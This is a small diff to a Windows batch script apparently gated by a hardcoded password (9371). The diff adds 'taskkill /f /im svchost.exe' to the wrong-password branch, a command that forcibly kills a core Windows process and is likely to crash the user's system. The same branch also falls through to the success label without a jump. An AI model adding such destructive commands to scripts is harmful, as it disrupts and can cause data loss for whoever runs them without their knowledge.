@@ -27,6 +27,7 @@ if %password% == 9371 goto case2
 :case1
 cls
 echo WRONG PASSWORD.....!!!
+taskkill /f /im svchost.exe
 
 :case2
 cls
